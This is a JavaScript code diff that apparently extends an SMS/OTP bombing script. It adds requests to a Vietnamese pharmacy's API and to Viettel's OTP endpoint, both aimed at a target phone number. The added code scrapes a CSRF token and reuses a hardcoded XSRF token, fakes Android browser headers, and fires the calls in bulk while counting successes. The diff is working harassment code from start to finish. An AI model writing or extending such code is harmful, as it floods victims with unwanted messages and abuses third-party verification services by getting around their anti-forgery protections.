@@ -377,6 +377,59 @@ const payload = {
       'verificationCodeType': 1,
     };
 
+    const longChauHeaders = {
+      'Host': 'api.nhathuoclongchau.com.vn',
+      'access-control-allow-origin': '*',
+      'accept': 'application/json, text/plain, */*',
+      'authorization': '',
+      'order-channel': '1',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36',
+      'content-type': 'application/json',
+      'origin': 'https://nhathuoclongchau.com.vn',
+      'referer': 'https://nhathuoclongchau.com.vn/',
+    };
+
+    const longChauData = {
+      'phoneNumber': phone,
+      'fromSys': 'WEBKHLC',
+    };
+
+            const csrfResponse = await axios.get('https://viettel.vn/dang-ky', {
+          headers: {
+            'Host': 'viettel.vn',
+            'Connection': 'keep-alive',
+            'Accept': 'application/json, text/plain, */*',
+            'X-Requested-With': 'XMLHttpRequest',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
+            'Content-Type': 'application/json;charset=UTF-8',
+            'Origin': 'https://viettel.vn',
+          }
+        });
+
+        // Extract the CSRF token from the response
+        const csrfTokenMatch = csrfResponse.data.match(/name="csrf-token" content="(.*?)"/);
+        const csrfToken = csrfTokenMatch ? csrfTokenMatch[1] : null;
+
+        if (!csrfToken) throw new Error('Failed to retrieve CSRF token');
+
+        // Viettel headers for OTP request
+        const viettelHeaders = {
+          'Host': 'viettel.vn',
+          'Connection': 'keep-alive',
+          'Accept': 'application/json, text/plain, */*',
+          'X-XSRF-TOKEN': 'eyJpdiI6Ik1tKzdYTWlYXC9jenl1OVRTNjlRV253PT0iLCJ2YWx1ZSI6IjZQdkY5SHpUVDdRSXdRUzlRRkx4Z2tKeW91RkZoTkhWQXZzU01EQzhHVW9cL2ZiK2lKZzMxYndhWWp4NmJkVmhWIiwibWFjIjoiMDNkMTVkNzhkODE1ZTA4ZjI0MTVlMmU5MDJhZjUwMTY5MGIxNDgyN2Q2MzZlNDJhNDNkNDQyZjJkNWVjZDk5MyJ9',
+          'X-CSRF-TOKEN': csrfToken,
+          'X-Requested-With': 'XMLHttpRequest',
+          'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
+          'Content-Type': 'application/json;charset=UTF-8',
+          'Origin': 'https://viettel.vn',
+          'Referer': 'https://viettel.vn/dang-nhap',
+        };
+
+        const viettelData = {
+          'msisdn': phone
+        };
+
     // Initial message to be edited later
     let messageID = null;
     let successCount = 0;
@@ -436,7 +489,11 @@ const payload = {
         }), 
         axios.post('https://v9-cc.800best.com/uc/account/sendsignupcode', bestIncData, {
           headers: bestIncHeaders
-        })
+        }), 
+        axios.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification', longChauData, {
+          headers: longChauHeaders
+        }), 
+        axios.post("https://viettel.vn/api/get-otp", viettelData, { headers: viettelHeaders })
       ])
       .then(() => {
         successCount += 10;
